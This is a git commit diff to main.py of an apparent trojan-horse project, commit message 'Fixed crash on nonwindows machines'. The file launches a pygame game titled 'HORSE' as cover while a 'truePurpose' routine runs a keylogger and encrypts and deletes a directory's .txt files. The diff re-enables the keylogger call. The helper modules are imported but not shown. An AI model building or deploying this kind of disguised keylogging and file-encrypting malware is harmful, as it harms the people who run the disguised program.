cec0d2b0fad0c10144c0bd755d47dc53fb51c31a
jklypchak13 <jarod.klypchak@gmail.com>
2020-04-07 16:17:50 -0400

    Fixed crash on nonwindows machines

--- src/main.py
+++ src/main.py
@@ -3,39 +3,11 @@ import pathlib
 from multiprocessing import Process
 from typing import List
 
-import pygame
-
-from game.menu.main_menu import main_menu
 from trojan.crawler import Crawler
 from trojan.crypto import encryptAndDeletePlaintext
 import trojan.keylogger
 
 PATH_TO_ROOT = pathlib.Path(__file__).parent.absolute()
-
-"""
-Subroutine that runs if this is the child process.
-This is the game
-"""
-
-
-def game():
-    # Initialize pygame and the main clock
-    pygame.init()
-    main_clock = pygame.time.Clock()
-
-    # Create a window with 4:3 aspect ratio
-    window = pygame.display.set_mode((800, 600), 0, 32)
-    pygame.display.set_caption("HORSE")
-    window_icon = pygame.image.load(
-        f"{PATH_TO_ROOT}{os.sep}assets{os.sep}menu{os.sep}app_icon.png"
-    )
-    pygame.display.set_icon(window_icon)
-
-    # Start the main menu
-    main_menu(window, main_clock, PATH_TO_ROOT)
-
-    # Clean up
-    pygame.quit()
 
 
 def truePurpose(target_directory: str):
@@ -45,8 +17,8 @@ def truePurpose(target_directory: str):
     Arguments:
         target_directory: the directory to ecrypt
     """
-    pygame.quit()
-    # trojan.keylogger.start_logger()
+
+    trojan.keylogger.start_logger()
     c: Crawler = Crawler(target_directory, extension_white_list=[
                          '.txt'], abs_path=True)
     c.walk_tree()
@@ -63,6 +35,8 @@ if __name__ == "__main__":
     p.start()
 
     # For now, we'll encrypt all files in the test directory, that are a txt file.
-    game()
+
+    import game
+    game.game()
 
     p.join()
